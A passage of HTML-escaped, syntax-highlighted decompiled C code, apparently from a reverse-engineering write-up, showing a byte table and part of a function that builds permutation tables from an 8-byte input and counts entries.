  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7A&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0D&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x43&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCA&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x53&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE4&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xED&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x75&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFE&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x95&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x06&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x89&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAE&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x55&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0A&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x94&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x24&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x07&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC8&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFC&lt;/span&gt;
};

&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; byte_404220[&lt;span style=&#34;color:#ae81ff&#34;&gt;520&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; byte_404420[&lt;span style=&#34;color:#ae81ff&#34;&gt;65537&lt;/span&gt;];

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; dword_404100[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;};

&lt;span style=&#34;color:#66d9ef&#34;&gt;using&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;namespace&lt;/span&gt; std;

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_401580&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a2) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// ebp
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v5; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v7; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v9; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v10; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v11; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v12; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v13; &lt;span style=&#34;color:#75715e&#34;&gt;// dl
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v14; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v15; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v16; &lt;span style=&#34;color:#75715e&#34;&gt;// ecx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v17; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// eax
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v19; &lt;span style=&#34;color:#75715e&#34;&gt;// dl
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v21; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+10h] [ebp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v22; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+11h] [ebp-Bh]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v23; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+12h] [ebp-Ah]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v24; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+13h] [ebp-9h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v25; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+14h] [ebp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  v25 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404420;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
    byte_404000[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a2[i];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    byte_404220[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404000[v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    byte_404220[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2;
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404220;
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_404100;
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;byte_404220[dword_404100[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4;                                 &lt;span style=&#34;color:#75715e&#34;&gt;// 2, 4, 8, 10h, 20h, 40h, 80h
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
      {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
        {
          v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v7 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_404000[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3];
          &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
          &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3;
          &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v6;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v6 );
      }
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;(dword_404100[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;]) );
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v25[&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v3&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;];
      &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v8;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v8 );
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2;
    v25 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; );
  v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;byte_404420[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt;];
  v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v9 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;) )
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v21;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v9 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;) )
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v22;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v9 )
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v23;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v9[&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;] )
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v24;
    v9 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v10;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v10 );
